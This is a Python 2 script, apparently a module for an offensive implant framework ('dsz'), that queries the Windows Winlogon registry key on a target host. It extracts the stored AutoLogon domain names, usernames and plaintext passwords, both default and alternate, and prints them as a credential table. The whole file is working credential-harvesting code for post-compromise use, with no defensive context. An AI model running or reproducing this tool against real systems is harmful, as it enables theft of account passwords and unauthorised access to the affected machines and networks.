
from collections import defaultdict
import dsz
import dsz.ui
from ops.pprint import pprint

def main():
    has_al = False
    logon_key = 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'
    reg_vals = registry_getdict(logon_key, 'l')
    auto_logon = reg_vals['AutoAdminLogon']
    default_domain = reg_vals['DefaultDomainName']
    default_username = reg_vals['DefaultUserName']
    default_password = reg_vals['DefaultPassword']
    alt_domain = reg_vals['AltDefaultDomainName']
    alt_username = reg_vals['AltDefaultUserName']
    alt_password = reg_vals['AltDefaultPassword']
    creds = []
    if ((default_password == '') and (auto_logon == '1')):
        has_al = True
        default_password = '[No Password!]'
    creds.append(['Default', default_domain, default_username, default_password])
    if ((alt_password == '') and (auto_logon == '1')):
        has_al = True
        alt_password = '[No Password!]'
    creds.append(['Alternate', alt_domain, alt_username, alt_password])
    if (not has_al):
        print ''
        dsz.ui.Echo('The host is not configured to have an AutoLogon password.', dsz.ERROR)
        print ''
    pprint(creds, header=['Type', 'Domain', 'Username', 'Password'])

def registry_getdict(key, hive):
    vdict = defaultdict((lambda : ''))
    cmd = ('registryquery -hive %s -key "%s"' % (hive, key))
    dsz.control.echo.Off()
    if (not dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)):
        return vdict
    if (not dsz.cmd.data.Size('Key::Value')):
        return vdict
    try:
        names = dsz.cmd.data.Get('Key::Value::name', dsz.TYPE_STRING)
        values = dsz.cmd.data.Get('Key::Value::value', dsz.TYPE_STRING)
        vdict.update(dict(zip(names, values)))
    except:
        dsz.ui.Echo(('Failed to get values from regquery for %s' % key))
    dsz.control.echo.On()
    return vdict
if (__name__ == '__main__'):
    main()